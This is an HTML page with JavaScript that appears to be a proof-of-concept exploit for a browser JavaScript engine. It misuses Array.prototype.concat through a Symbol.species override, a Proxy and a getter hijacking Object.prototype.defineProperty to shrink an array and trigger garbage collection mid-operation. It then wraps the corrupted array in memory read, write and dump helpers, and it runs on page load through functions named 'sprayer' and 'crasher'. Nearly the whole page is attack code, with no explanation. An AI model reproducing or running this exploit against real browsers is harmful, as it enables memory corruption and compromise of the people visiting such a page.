<html>

<div id="log"></div>
<script>
function log(s) {
    var log = document.getElementById("log");
    var ele = document.createElement("span");
    ele.innerHTML = s;
    log.appendChild(ele);
    log.appendChild(document.createElement("br"));
}

function hex(d, flag) {
    if (d == undefined) return "0xUNDEFINED";
    var pad = "00000000";
    var str = d.toString(16);
    var ret = pad.substring(0, pad.length - str.length) + str; 
    if (flag) return "0x" + ret;
    else return ret;
}

function gc() {
    for (var i = 0; i < 0x10000; i++) {
        var zz = new String();
    }
}

function Float64_to_Uint32(corrupted) {
    var f64 = new Float64Array(corrupted);
    var u32 = new Uint32Array(f64.buffer);
    return u32;
}

function MemView(corrupted) {

    var mem32 = new Uint32Array(Float64_to_Uint32(corrupted));
    var mem16 = new Uint16Array(Float64_to_Uint32(corrupted));
    var mem8  = new Uint8Array(Float64_to_Uint32(corrupted));

    function read32(index) {
        return mem32[index];
    }

    function read16(index) {
        return mem16[index];
    }

    function read8(index) {
        return mem8[index];
    }

    function write32(index, value) {
        mem32[index] = value & 0xffffffff;
    }

    function readString(index) {
        var r = "";
        for (; mem8[index] != 0; index++)
            r += String.fromCharCode(mem8[index]);
        return r;
    }

    function dump64(index) {
        var lo = mem32[index],
            hi = mem32[index+1];
        if ( lo == undefined || hi == undefined) return;
        lo.toString(16);
        hi.toString(16);
        log(hex(hi, true) + hex(lo, false));
    }

    function dumpmem() {
        for (var i = 0; i < mem32.length; i++) {
            dump64(i * 2);
        }
    }
    
    function fill() {
        for (var i = 0; i < mem32.length; i++) {
            write32(i, 0x61616161);
        }
    }

    function length() {
        return corrupted.length;
    }

    function snapshot() {
        return corrupted.slice();
    }
    
    return {
        dump64: dump64,
        read32: read32,
        read16: read16,
        read8 : read8,
        write32: write32,
        readString: readString,
        dumpmem: dumpmem,
        length: length,
        fill: fill,
        snapshot: snapshot
    };
}

function evil_double_array(len) {
    var p = new Proxy([], {});    
    var tmp = Object.prototype.defineProperty;

    class CustomArray extends Array {
        static get [Symbol.species]() { return function() { return p; } };
    }

    var w = new CustomArray(len);
    for (var i = 1; i < 4; i++)
        w[i] = 0.1;

    function evil_callback() {
        w.length = 1;
        gc();
        return tmp;
    }

    Object.prototype.__defineGetter__("defineProperty", evil_callback);

    return w;
}

function evil_object_array(len) {
    var p = new Proxy([], {});    
    var tmp = Object.prototype.defineProperty;

    class CustomArray extends Array {
        static get [Symbol.species]() { return function() { return p; } };
    }

    var w = new CustomArray(len);
    w[0] = {};
    for (var i = 2; i < 4; i++)
        w[i] = 0.1;

    function evil_callback() {
        w.length = 1;
        gc();
        return tmp;
    }

    Object.prototype.__defineGetter__("defineProperty", evil_callback);

    return w;
}


var sprayer = Array.prototype.concat.call(evil_double_array(0x1000));
var crasher = Array.prototype.concat.call(evil_object_array(256));

</script>
</html>
